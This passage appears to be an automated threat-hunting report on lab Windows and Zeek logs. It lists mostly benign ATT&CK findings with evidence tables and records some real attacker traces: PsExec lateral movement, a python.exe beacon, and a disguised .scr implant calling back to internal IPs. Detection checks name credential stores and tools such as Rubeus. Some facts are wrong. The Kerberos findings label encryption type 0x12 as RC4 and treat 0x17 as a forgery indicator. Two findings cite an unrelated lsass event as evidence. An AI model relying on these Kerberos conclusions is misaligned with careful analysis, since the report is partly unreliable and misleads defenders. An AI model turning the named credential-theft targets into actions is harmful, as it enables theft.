| 4 | 2020-05-02 03:21:05.914Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Users\pbeesly\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\MicrosoftEdge\User\Default\Recovery\Active\RecoveryStore.{5E6C474D-D0E6-4BC1-A0… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOZEq4k | q-6bfb38ccdf | ok |
| 5 | 2020-05-02 03:21:05.681Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Windows\ServiceProfiles\LocalService\AppData\Local\Packages\warp_jit_db4a1097-b484-4973-bbf2-a04208ecd4d4\AC\INetCookies | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOVAUl3 | q-62d84c5515 | ok |

### F25 · benign / medium · T1552.002 · No credential-bearing registry access observed

Evidence status: **verified**

Registry modification events (Sysmon EventID 13) touching Winlogon/Lsa keys on scranton.dmevals.local are routine system writes (PasswordExpiryNotification, VolatileUserMgrKey contextLuid, LsaPid, LsaCfgFlagsDefault, ShutdownFlags). No reads/writes of credential-storage values such as DefaultPassword, AutoAdminLogon, or cached credential blobs were observed, and the targeted checks for reg query/save/export and SAM/SECURITY/Credentials object access returned no hits.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:21:20.841Z | scranton.dmevals.local | windows.sysmon | registry.path | HKU\S-1-5-21-1830255721-3727074217-2423397540-1107\Software\Microsoft\Windows\Winlogon\PasswordExpiryNotification\NotShownReason | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItKT-1UI | q-a892a4d70c | ok |
| 2 | 2020-05-02 03:19:09.865Z | scranton.dmevals.local | windows.sysmon | registry.path | HKLM\System\CurrentControlSet\Control\Lsa\LsaCfgFlagsDefault | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItO9rO3W | q-a892a4d70c | ok |

### F24 · benign / high · T1552.006 · SYSVOL GptTmpl.inf reads by machine accounts are normal GPO application

Evidence status: **verified**

Security EventID 5145 shows reads of dmevals.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf from the \\*\SYSVOL share on newyork.dmevals.local. The accessing accounts are machine accounts SCRANTON$ and NASHUA$ (domain-joined computers applying Group Policy), not interactive users, and the file is GptTmpl.inf (security template), not Groups.xml with a cpassword. This is routine Group Policy processing, not Group Policy Preferences credential harvesting.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:16.000Z | newyork.dmevals.local | windows.security | win.RelativeTargetName | dmevals.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItV3-aUm | q-f71e492cb6 | ok |
| 2 | 2020-05-02 03:19:16.000Z | newyork.dmevals.local | windows.security | user.name | SCRANTON$ | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItV3-aUm | q-f71e492cb6 | ok |
| 3 | 2020-05-02 03:10:40.000Z | newyork.dmevals.local | windows.security | user.name | NASHUA$ | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ7E__C | q-f71e492cb6 | ok |

### F28 · benign / high · T1555.003 · No browser credential-store access observed

Evidence status: **verified**

All browser-credential checks returned zero hits: no process command lines referencing Login Data, logins.json, key3.db/key4.db or signons.sqlite (C192), no 4663 object access to those files (C193), no PowerShell script blocks referencing them (C194), and no other-channel events (C195). The single file-creation hit (C191) is an unrelated INetCookies file under a LocalService package path, not a browser credential store. No evidence of web-browser credential theft.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.TargetImage | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-c52e4cc4c7 | ok |

### F27 · benign / medium · T1555.004 · LSASS handle access dominated by benign system processes; no cmdkey/vault activity

Evidence status: **verified**

The 326 Sysmon event.code 10 accesses to lsass.exe are overwhelmingly benign: 293 use GrantedAccess 0x1000 (PROCESS_QUERY_LIMITED_INFORMATION) from svchost.exe, Windows Defender (MsMpEng.exe) and CollectGuestLogs.exe. The six Security 4663 object-access events on lsass.exe all carry AccessMask 0x10 (read attributes) from CollectGuestLogs.exe, MsMpEng.exe and one PowerShell instance. No cmdkey.exe or vault command lines were observed (checks C199/C200 zero hits), so there is no direct evidence of Windows Credential Manager vault harvesting beyond the anomalous PowerShell LSASS open reported under T1555.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:20:15.000Z | scranton.dmevals.local | windows.security | win.ProcessName | C:\Program Files\Windows Defender\MsMpEng.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItVq1T6- | q-440636c43c | ok |
| 2 | 2020-05-02 03:20:15.000Z | scranton.dmevals.local | windows.security | win.AccessMask | 0x10 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItVq1T6- | q-440636c43c | ok |
| 3 | 2020-05-02 03:03:38.000Z | newyork.dmevals.local | windows.security | win.ProcessName | C:\WindowsAzure\Packages\CollectGuestLogs.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaDOqAA | q-440636c43c | ok |
| 4 | 2020-05-02 02:56:14.000Z | utica.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1000 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQE_JuD | q-0ac93e9f06 | ok |

### F29 · benign / high · T1555.005 · No password-manager artifacts observed

Evidence status: **verified**

All password-manager checks returned zero hits: no KeePass/1Password/Bitwarden/LastPass process executions (C203), no kdbx command lines (C204), no kdbx/1password/bitwarden file creations (C205), no process access to those targets (C206), no PowerShell script blocks referencing kdbx/KeePass/1Password (C207), and no service installs of those binaries (C208). No evidence of password-manager credential theft.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.TargetImage | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-c52e4cc4c7 | ok |

### F30 · benign / high · T1556 · LSASS handle access dominated by legitimate system processes; no authentication-process modification observed

Evidence status: **verified**

326 Sysmon event.code 10 accesses to lsass.exe were observed across utica, scranton and newyork. Stacking by source image shows 289 from C:\windows\system32\svchost.exe with GrantedAccess 0x1000 (PROCESS_QUERY_LIMITED_INFORMATION), plus Azure antimalware/telemetry agents (0x1400). These are normal Windows/AV behaviours. No modification of the authentication process (no LSA registry writes, no auth DLL replacement, no service installs targeting auth components) was found.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:56:14.000Z | utica.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\svchost.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQE_JuD | q-d51d07a1a0 | ok |
| 2 | 2020-05-02 02:56:14.000Z | utica.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1000 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQE_JuD | q-d51d07a1a0 | ok |
| 3 | 2020-05-02 02:56:14.000Z | utica.dmevals.local | windows.sysmon | win.TargetImage | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQE_JuD | q-d51d07a1a0 | ok |

### F31 · benign / high · T1556.001 · No domain-controller authentication tampering; LSASS module loads are Microsoft-signed

Evidence status: **verified**

On the DCs (scranton, newyork, nashua, utica) the only modules loaded into lsass.exe were Microsoft-signed (lsass.exe, samsrv.dll, wdigest.dll, SignatureStatus Valid). No unexpected DLL was loaded into lsass, no 4657 registry write to lsass/cryptdll/wdigest/SecurityProviders, and no 7045 service install referencing lsass/cryptdll. The LSASS accesses seen are the same benign svchost/AV pattern.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:09.850Z | scranton.dmevals.local | windows.sysmon | win.ImageLoaded | C:\Windows\System32\samsrv.dll | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItPEz_fX | q-d1ae30109d | ok |
| 2 | 2020-05-02 03:19:09.850Z | scranton.dmevals.local | windows.sysmon | win.SignatureStatus | Valid | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItPEz_fX | q-d1ae30109d | ok |
| 3 | 2020-05-02 03:19:10.196Z | scranton.dmevals.local | windows.sysmon | win.ImageLoaded | C:\Windows\System32\wdigest.dll | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItO7oWgL | q-d1ae30109d | ok |

### F32 · benign / high · T1556.002 · No password filter DLL registration or Notification Packages modification

Evidence status: **verified**

Searches for registry writes to Notification Packages / PasswordFilter / LSA keys (4657) and for service installs with password/filter image paths (7045) returned no hits. The only 4657 registry writes observed were to WMI Autologger EventLog-Application keys and SystemCertificates ROOT by the machine account (SCRANTON$), which are routine. No password filter DLL was registered.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:16.000Z | scranton.dmevals.local | windows.security | win.ObjectName | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\WMI\Autologger\EventLog-Application\{3000b92b-ca8b-4269-90ea-c4185ee09e92} | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItVt5I2Y | q-c128d7a599 | ok |
| 2 | 2020-05-02 03:19:16.000Z | scranton.dmevals.local | windows.security | win.SubjectUserName | SCRANTON$ | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItVt5I2Y | q-c128d7a599 | ok |

### F33 · benign / high · T1556.005 · No reversible-encryption flag changes (no 4739/4738 events)

Evidence status: **verified**

Queries for event.code 4739 (domain policy changed), 4738 (user account changed), 5136/5137/5141 (directory service object changes) returned zero hits across the whole security dataset. No reversible-encryption or AllowReversiblePasswordEncryption activity was observed in PowerShell, Sysmon process creation, or service installs. All 297 event.code 4624 logons use standard logon processes (Kerberos 217, Advapi 76, User32 2, NtLmSsp 1) and the Kerberos authentication package.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:55:54.000Z | newyork.dmevals.local | windows.security | win.LogonProcessName | Kerberos | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaKXhpQ | q-418a8ee2b7 | ok |
| 2 | 2020-05-02 02:55:54.000Z | newyork.dmevals.local | windows.security | win.AuthenticationPackageName | Kerberos | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaKXhpQ | q-418a8ee2b7 | ok |

### F34 · benign / high · T1556.006 · No MFA/authentication policy modification; all logons use standard packages

Evidence status: **verified**

All 297 event.code 4624 logons use standard logon processes (Kerberos 217, Advapi 76, User32 2, NtLmSsp 1) and standard authentication packages (Kerberos). No 4739 policy-change events and no PowerShell/Sysmon activity referencing ADAuthenticationPolicy or MFA settings were found, so no multi-factor authentication process was modified.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:55:54.000Z | newyork.dmevals.local | windows.security | win.LogonProcessName | Kerberos | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaKXhpQ | q-418a8ee2b7 | ok |
| 2 | 2020-05-02 02:55:54.000Z | newyork.dmevals.local | windows.security | win.AuthenticationPackageName | Kerberos | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaKXhpQ | q-418a8ee2b7 | ok |

### F35 · benign / high · T1556.007 · No hybrid-identity / directory-service object modification (no 5136/5137/5141)

Evidence status: **verified**

Searches for directory service change events (5136, 5137, 5141) in windows.security and windows.other returned zero hits. No modification of federated/hybrid identity configuration was observed; logons continue to use the standard Kerberos package.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:55:54.000Z | newyork.dmevals.local | windows.security | win.LogonProcessName | Kerberos | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaKXhpQ | q-418a8ee2b7 | ok |
| 2 | 2020-05-02 02:55:54.000Z | newyork.dmevals.local | windows.security | win.AuthenticationPackageName | Kerberos | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaKXhpQ | q-418a8ee2b7 | ok |

### F36 · benign / high · T1556.008 · No Network Provider DLL registration or Winlogon registry modification

Evidence status: **verified**

Registry-write searches for NetworkProvider / SecurityProviders / Winlogon keys (Sysmon event.code 13 and Security 4657) returned no relevant hits; the 4657 events present were WMI Autologger and SystemCertificates writes. No Network Provider DLL was registered or modified.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:16:19.000Z | nashua.dmevals.local | windows.security | win.ObjectName | \REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates\BE36A4562FB2EE05DBB3D32323ADF445084ED656 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ6CoZN | q-c128d7a599 | ok |

### F38 · benign / medium · T1557 · No adversary-in-the-middle activity; observed activity is PsExec lateral movement with python.exe C2

Evidence status: **verified**

The T1557 check hits (object access 4663/4656/4670, SMB connections, DNS queries) reflect normal Windows/AD behaviour. The genuinely suspicious activity in the window is not AiTM: on nashua.dmevals.local the PSEXESVC service (installed by user pbeesly) spawned C:\Windows\Temp\python.exe, which then made repeated outbound TCP connections to 192.168.0.4:8443. That is lateral movement / C2, not interception. No evidence of traffic interception, relay, or credential capture via a man-in-the-middle position was found.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:39.000Z | nashua.dmevals.local | windows.other | message | A service was installed in the system.    Service Name:  PSEXESVC  Service File Name:  %SystemRoot%\PSEXESVC.exe  Service Type:  user mode service  Service Star… | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHNH1uOFchItbrYMQT | q-5770ca1245 | ok |
| 2 | 2020-05-02 03:11:40.213Z | nashua.dmevals.local | windows.sysmon | process.command_line | "C:\Windows\Temp\python.exe"  | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTVGQmt | q-11c555da7a | ok |
| 3 | 2020-05-02 03:11:40.213Z | nashua.dmevals.local | windows.sysmon | process.parent.executable | C:\Windows\PSEXESVC.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTVGQmt | q-11c555da7a | ok |

### F39 · benign / medium · T1557.001 · SMB traffic is normal internal DC/GPO access; no SMB relay or name-resolution poisoning observed

Evidence status: **verified**

Sysmon EventCode 3 SMB connections (port 445/139) all target internal hosts: 10.0.0.4 (NEWYORK DC), 10.0.1.6, and link-local fe80::e40c:95b6:b0a7:6429, from System processes on newyork/scranton/nashua/utica. Zeek SMB activity is routine domain traffic (\\NEWYORK.dmevals.local\IPC$, \sysvol GPO reads, DRS/LsarLookupSids3 DCE-RPC). DNS queries are normal AD resolution (newyork.dmevals.local -> 10.0.0.4, wec.dmevals.local -> 10.0.1.10, wpad NXDOMAIN, ldap SRV records). No rogue SMB destination, no LLMNR/NBT-NS poisoning, and no relayed authentication was observed. The PSEXESVC service installs are PsExec lateral movement, not SMB relay.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:01:43.033Z | scranton.dmevals.local | windows.sysmon | destination.ip | 10.0.0.4 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTqgghU | q-757c5fe0bf | ok |
| 2 | 2020-04-30 00:06:38.912Z | simplerockbuild.simplerock.lan | zeek | zeek.path | \\NEWYORK.dmevals.local\IPC$ | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrog4 | q-6d637dd937 | ok |
| 3 | 2020-04-30 00:06:38.899Z | simplerockbuild.simplerock.lan | zeek | zeek.answers | ["10.0.0.4"] | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrYj4 | q-a196709742 | ok |

### F40 · benign / medium · T1557.002 · No ARP cache poisoning signature; each source MAC maps to a single IP

Evidence status: **NOT verified (1/2 evidence items)** — excluded from the verdict

Stacking zeek conn source MAC addresses shows three MACs each bound to a single source IP (00:0d:3a:13:e3:69 -> 10.0.1.6, 00:0d:3a:4d:42:f2 -> 10.0.1.4, fc:bd:67:e1:a9:c1 -> 10.0.1.4). There is no single MAC claiming many IPs, which is the signature of ARP cache poisoning. Sysmon EventCode 3 destinations are all internal/expected. No ARP manipulation evidence was found.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:06:38.912Z | simplerockbuild.simplerock.lan | zeek | zeek.orig_l2_addr | None | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrog4 | q-7c7e4b60f5 | FAILED: cited query did not return this event; field zeek.orig_l2_addr not in the event |
| 2 | 2020-04-30 00:06:38.912Z | simplerockbuild.simplerock.lan | zeek | source.ip | 10.0.1.4 | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrog4 | q-6d637dd937 | ok |

### F41 · benign / medium · T1557.003 · No DHCP spoofing activity observed

Evidence status: **verified**

No DHCP-related events were found: the windows.other DHCP checks (1341/1342/1020/1063) and the powershell dhcp/netsh/route-add check returned zero hits, and the windows.security UDP 5156 check returned zero hits. Stacking Sysmon UDP EventCode 3 destination ports shows no DHCP (67/68) traffic; the only UDP ports are DNS 53, NetBIOS 137/138, NTP 123, LDAP 389 and ephemeral high ports. No DHCP spoofing evidence was found.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:56:48.006Z | newyork.dmevals.local | windows.sysmon | destination.port | 445 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQD9ggh | q-757c5fe0bf | ok |

### F43 · benign / high · T1558.001 · No Golden Ticket activity — Kerberos TGT/TGS events are normal

Evidence status: **verified**

The 4769 TGS requests on newyork.dmevals.local (28 total) are all successful (Status 0x0) RC4 (TicketEncryptionType 0x12) requests for pbeesly@DMEVALS.LOCAL and SCRANTON$@DMEVALS.LOCAL, including krbtgt service requests that are part of normal TGT renewal. No forged-TGT indicators (no anomalous krbtgt service tickets, no 0x17 encryption, no ticket files) were observed. The LSASS access that could yield a KRBTGT hash was seen (see T1558 finding) but no golden-ticket use followed in the data.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:04.000Z | newyork.dmevals.local | windows.security | win.ServiceName | krbtgt | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaDOKC- | q-e11b5c0414 | ok |
| 2 | 2020-05-02 03:04:04.000Z | newyork.dmevals.local | windows.security | win.TicketEncryptionType | 0x12 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaDOKC- | q-e11b5c0414 | ok |
| 3 | 2020-05-02 03:04:04.000Z | newyork.dmevals.local | windows.security | win.Status | 0x0 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaDOKC- | q-e11b5c0414 | ok |

### F44 · benign / high · T1558.002 · No Silver Ticket activity — service ticket requests are normal

Evidence status: **verified**

The 4769 service-ticket requests (win.ServiceName: NEWYORK$, NASHUA$, SCRANTON$, WEC$, krbtgt) are all successful RC4 requests from pbeesly and SCRANTON$ on newyork.dmevals.local, consistent with ordinary host/service authentication. No forged service tickets or anomalous service access were observed.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:09:23.000Z | newyork.dmevals.local | windows.security | win.ServiceName | NASHUA$ | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ8FbW6 | q-e11b5c0414 | ok |
| 2 | 2020-05-02 03:19:14.000Z | newyork.dmevals.local | windows.security | win.ServiceName | WEC$ | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItV3-aUM | q-e11b5c0414 | ok |

### F45 · benign / high · T1558.003 · No Kerberoasting — no RC4 TGS requests for user service accounts

Evidence status: **verified**

No Kerberoasting pattern was found: the 4769 requests target only machine accounts (NEWYORK$, NASHUA$, SCRANTON$, WEC$) and krbtgt, not user service accounts, and there is no burst of RC4 (0x17/0x12) TGS requests for SPN-bearing user accounts. The 4768 AS-REQ events for pbeesly all show PreAuthType 2 (pre-authentication enabled), and no kerberoast/GetUserSPNs/Rubeus command lines were found in PowerShell or Sysmon process-creation events.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:18.000Z | newyork.dmevals.local | windows.security | win.PreAuthType | 2 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ7Ef_w | q-7cd62bc680 | ok |
| 2 | 2020-05-02 03:09:23.000Z | newyork.dmevals.local | windows.security | win.TargetUserName | pbeesly@DMEVALS.LOCAL | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ8FbW6 | q-e11b5c0414 | ok |

### F46 · benign / high · T1558.004 · No AS-REP Roasting — all AS-REQs use pre-authentication

Evidence status: **verified**

All 14 Kerberos AS-REQ (4768) events on newyork.dmevals.local for pbeesly and SCRANTON$ show win.PreAuthType 2 (pre-authentication required) and Status 0x0, so no accounts are configured without pre-auth and no AS-REP roasting occurred. No asreproast/GetNPUsers/Rubeus command lines were found in PowerShell or Sysmon process-creation events.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:18.000Z | newyork.dmevals.local | windows.security | win.PreAuthType | 2 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ7Ef_w | q-7cd62bc680 | ok |
| 2 | 2020-05-02 03:19:13.000Z | newyork.dmevals.local | windows.security | win.PreAuthType | 2 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItV3-aXJ | q-7cd62bc680 | ok |

### F47 · benign / high · T1606 · No forged web credential activity; hits are benign Sysinternals/DSC PowerShell and normal logons

Evidence status: **verified**

The T1606 check hits do not show web credential forging. The single PowerShell 4104 script block matching token/cookie/SAML keywords is the Sysinternals readme.ps1 helper function Get-AttributesMask (win.Path C:\Program Files\SysinternalsSuite\readme.ps1), run by pbeesly on scranton.dmevals.local at 2020-05-01T23:04:04. The 4624/4648 logon stack is dominated by Kerberos (217) and Advapi (76) logon processes, i.e. normal machine/service logons. The 7045 service installs are PSEXESVC (PsExec) and a Java support service, and the 5857/5858 WMI events are routine RSOP_ExtensionStatus DeleteInstance operations by SYSTEM. None of these constitute forging of web credentials.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:04.000Z | scranton.dmevals.local | windows.powershell | win.Path | C:\Program Files\SysinternalsSuite\readme.ps1 | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZRllBR | q-2ec998f72d | ok |
| 2 | 2020-05-02 03:04:04.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-AttributesMask($AttributesMask) {     &lt;#         SE_GROUP_MANDATORY          0x00000001  The group is mandatory.         SE_GROUP_ENABLED_BY_DEF… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZRllBR | q-df9a8f05d9 | ok |
| 3 | 2020-05-02 03:04:15.000Z | scranton.dmevals.local | windows.other | process.executable | C:\Windows\System32\javamtsup.exe | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHNH1uOFchItbrX8TL | q-101b4b62b3 | ok |
| 4 | 2020-05-02 03:11:39.000Z | nashua.dmevals.local | windows.other | process.executable | %SystemRoot%\PSEXESVC.exe | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHNH1uOFchItbrYMQT | q-101b4b62b3 | ok |

### F48 · benign / high · T1606.001 · No forged/stolen web cookie activity; only benign INetCookies file and unrelated implant

Evidence status: **verified**

The only file path matching cookie stores is C:\Windows\ServiceProfiles\LocalService\AppData\Local\Packages\warp_jit_db4a1097-b484-4973-bbf2-a04208ecd4d4\AC\INetCookies, created by C:\windows\System32\svchost.exe on scranton.dmevals.local at 2020-05-02T03:21:05 — a normal Windows service-profile cookie store, not a forged cookie artifact. The PowerShell 4104 hit for cookie/session keywords is the same benign Sysinternals readme.ps1. Separately, a suspicious implant C:\ProgramData\victim\cod.3aka3.scr (launched by explorer.exe as pbeesly, /S) beacons to 192.168.0.5:1234, but this is C2/implant behaviour, not web cookie forging, and no cookie manipulation was observed.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:21:05.681Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Windows\ServiceProfiles\LocalService\AppData\Local\Packages\warp_jit_db4a1097-b484-4973-bbf2-a04208ecd4d4\AC\INetCookies | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOVAUl3 | q-3398ffb678 | ok |
| 2 | 2020-05-02 03:21:05.681Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\System32\svchost.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOVAUl3 | q-3398ffb678 | ok |
| 3 | 2020-05-02 02:55:56.157Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\ProgramData\victim\â€®cod.3aka3.scr" /S | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQE_psP | q-01cb9db640 | ok |
| 4 | 2020-05-02 02:55:59.631Z | scranton.dmevals.local | windows.sysmon | destination.port | 1234 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQE_Zth | q-3d7a7d1de6 | ok |

### F49 · benign / high · T1606.002 · No SAML token forging observed

Evidence status: **verified**

No SAML assertion, NotOnOrAfter, or token-forging artifacts were found. The PowerShell 4104 script-block inventory contains only Sysinternals and DSC module scripts (psversion.ps1, readme.ps1, xNetworking/xStorage/xActiveDirectory DSC resources, 7Zip4Powershell) — no SAML/token manipulation. Zeek kerberos traffic is normal: pbeesly obtains TGTs/TGSs (krbtgt/DMEVALS.LOCAL, cifs/NASHUA, host/nashua.dmevals.local) with standard KDC_ERR_PREAUTH_REQUIRED then success, and no SAML HTTP requests were seen.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:04.000Z | scranton.dmevals.local | windows.powershell | win.Path | C:\Program Files\SysinternalsSuite\readme.ps1 | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZRllBR | q-2ec998f72d | ok |
| 2 | 2020-04-30 00:24:19.110Z | simplerockbuild.simplerock.lan | zeek | zeek.error_msg | KDC_ERR_PREAUTH_REQUIRED | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrYi0 | q-97861e1994 | ok |
| 3 | 2020-04-30 00:24:19.124Z | simplerockbuild.simplerock.lan | zeek | zeek.service | krbtgt/DMEVALS.LOCAL | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrIjk | q-97861e1994 | ok |

### F50 · benign / high · T1621 · No MFA request generation observed; hits are routine WMI provider activity and PsExec lateral movement

Evidence status: **verified**

